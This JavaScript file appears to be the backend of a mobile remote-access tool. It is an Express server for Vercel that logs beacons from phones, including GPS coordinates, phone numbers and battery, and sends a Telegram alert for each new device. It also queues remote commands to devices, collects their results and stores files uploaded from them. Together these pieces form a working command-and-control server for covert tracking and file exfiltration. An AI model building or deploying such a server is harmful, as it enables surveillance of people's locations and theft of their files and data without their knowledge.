const express = require('express');
const cors = require('cors');
const { kv } = require('@vercel/kv');
const bot = require('../bot');

const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Helper: generate device ID from request
function getDeviceId(req) {
  return req.headers['x-device-id'] || req.body.deviceId || req.query.deviceId;
}

// ==============================
// API ENDPOINTS
// ==============================

// GET /api/devices - List all devices
app.get('/api/devices', async (req, res) => {
  try {
    const devices = await kv.get('devices') || [];
    res.json(devices);
  } catch (error) {
    console.error('[DB] Error:', error);
    res.status(500).json({ error: 'Database error' });
  }
});

// GET /api/devices/:id - Get device detail
app.get('/api/devices/:id', async (req, res) => {
  const { id } = req.params;
  try {
    const devices = await kv.get('devices') || [];
    const device = devices.find(d => d.id === id);
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    res.json(device);
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// POST /api/beacon - Device heartbeat
app.post('/api/beacon', async (req, res) => {
  const { deviceId, model, manufacturer, os, battery, lat, lon, network, phone } = req.body;

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId required' });
  }

  console.log(`[BEACON] ${deviceId} | ${model} | ${os} | Battery: ${battery}%`);

  try {
    let devices = await kv.get('devices') || [];
    let isNew = !devices.find(d => d.id === deviceId);

    const device = {
      id: deviceId,
      model: model || 'Unknown',
      manufacturer: manufacturer || 'Unknown',
      os: os || 'Unknown',
      battery: battery || 0,
      last_lat: lat || null,
      last_lon: lon || null,
      network: network || null,
      phone: phone || null,
      last_seen: new Date().toISOString(),
      first_seen: isNew ? new Date().toISOString() : (devices.find(d => d.id === deviceId)?.first_seen || new Date().toISOString()),
      status: 'active'
    };

    // Update or insert
    if (isNew) {
      devices.push(device);
      console.log(`[BOT] New device detected: ${deviceId} (${model})`);
      
      // Send Telegram notification
      bot.notifyDeviceConnected(deviceId, model, os, battery, lat, lon)
        .then(() => console.log(`[BOT] Notification sent for: ${deviceId}`))
        .catch(err => console.error('[BOT] Failed:', err.message));
    } else {
      const index = devices.findIndex(d => d.id === deviceId);
      devices[index] = { ...devices[index], ...device };
    }

    await kv.set('devices', devices);

    // Check for pending commands
    let commands = await kv.get('commands') || [];
    const pendingCommand = commands.find(c => c.device_id === deviceId && c.status === 'pending');

    if (pendingCommand) {
      return res.json({
        command: pendingCommand.command,
        params: pendingCommand.params || {},
        command_id: pendingCommand.id
      });
    }

    res.json({ status: 'ok' });

  } catch (error) {
    console.error('[DB] Beacon error:', error);
    res.status(500).json({ error: 'Database error' });
  }
});

// POST /api/result - Command result
app.post('/api/result', async (req, res) => {
  const { deviceId, command, result, command_id } = req.body;

  if (!deviceId || !command) {
    return res.status(400).json({ error: 'deviceId and command required' });
  }

  console.log(`[RESULT] ${deviceId} | ${command}`);

  try {
    let commands = await kv.get('commands') || [];
    let cmdIndex = -1;

    if (command_id) {
      cmdIndex = commands.findIndex(c => c.id === command_id && c.device_id === deviceId);
    } else {
      cmdIndex = commands.findIndex(c => c.device_id === deviceId && c.command === command && c.status === 'pending');
    }

    if (cmdIndex !== -1) {
      commands[cmdIndex].status = 'executed';
      commands[cmdIndex].executed_at = new Date().toISOString();
      commands[cmdIndex].result = JSON.stringify(result || {});
      await kv.set('commands', commands);
    }

    res.json({ status: 'ok' });

  } catch (error) {
    console.error('[DB] Result error:', error);
    res.status(500).json({ error: 'Database error' });
  }
});

// POST /api/command - Queue a command
app.post('/api/command', async (req, res) => {
  const { deviceId, command, params } = req.body;

  if (!deviceId || !command) {
    return res.status(400).json({ error: 'deviceId and command required' });
  }

  console.log(`[CMD_QUEUE] ${deviceId} | ${command}`);

  try {
    let commands = await kv.get('commands') || [];
    const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 7);

    commands.push({
      id: cmdId,
      device_id: deviceId,
      command: command,
      params: params || {},
      status: 'pending',
      issued_at: new Date().toISOString()
    });

    await kv.set('commands', commands);

    res.json({
      status: 'queued',
      commandId: cmdId,
      deviceId: deviceId,
      command: command
    });

  } catch (error) {
    console.error('[DB] Command error:', error);
    res.status(500).json({ error: 'Database error' });
  }
});

// POST /api/upload - Upload file
app.post('/api/upload', async (req, res) => {
  const { deviceId, filename, data } = req.body;

  if (!deviceId || !filename) {
    return res.status(400).json({ error: 'deviceId and filename required' });
  }

  try {
    const files = await kv.get('files') || [];
    files.push({
      id: Date.now() + '_' + Math.random().toString(36).slice(2, 7),
      device_id: deviceId,
      filename: filename,
      size: data.length,
      uploaded_at: new Date().toISOString(),
      data: data // base64 data stored in Redis
    });

    await kv.set('files', files);

    res.json({
      status: 'uploaded',
      fileId: files[files.length - 1].id,
      size: data.length
    });

  } catch (error) {
    console.error('[UPLOAD] Error:', error);
    res.status(500).json({ error: 'Upload failed' });
  }
});

// GET /api/files/:deviceId - List files
app.get('/api/files/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    const files = await kv.get('files') || [];
    const deviceFiles = files.filter(f => f.device_id === deviceId);
    res.json(deviceFiles);
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// DELETE /api/device/:id - Remove device
app.delete('/api/device/:id', async (req, res) => {
  const { id } = req.params;
  try {
    let devices = await kv.get('devices') || [];
    devices = devices.filter(d => d.id !== id);
    await kv.set('devices', devices);
    res.json({ status: 'deleted', deviceId: id });
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// GET /api/stats - Stats
app.get('/api/stats', async (req, res) => {
  try {
    const devices = await kv.get('devices') || [];
    const online = devices.filter(d => {
      const lastSeen = new Date(d.last_seen);
      const now = new Date();
      return (now - lastSeen) < 300000; // 5 minutes
    }).length;

    res.json({
      total: devices.length,
      online: online,
      offline: devices.length - online
    });
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// GET /api/health
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Export for Vercel
module.exports = app;
